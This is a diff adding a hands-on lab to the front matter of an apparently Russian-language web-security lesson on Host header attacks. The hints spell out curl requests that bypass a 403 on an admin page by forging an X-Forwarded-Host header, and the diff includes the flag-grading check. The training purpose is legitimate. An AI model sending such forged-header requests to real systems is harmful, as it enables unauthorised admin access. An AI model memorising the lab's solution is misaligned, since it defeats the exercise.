@@ -12,6 +12,18 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 45
 summary: "Как заголовок Host и X-Forwarded-* ломают сброс пароля, роутинг, кэш и контроль доступа."
+lab:
+  kind: shell
+  title: "Практика: Host header"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Прямой доступ: `curl -s -i 'http://shop.local/admin'` → 403.
+    - Фронтенд маршрутизирует по Host и доверяет `X-Forwarded-Host`.
+    - Подставь внутренний vhost: `curl -s -i 'http://shop.local/admin' -H 'X-Forwarded-Host: internal.shop.local'`.
+    - Флаг — последняя строка: `curl -s 'http://shop.local/admin' -H 'X-Forwarded-Host: internal.shop.local' | tail -1 > found.txt`, затем `check`.
 ---
 
 ## Вопрос, с которого всё начинается
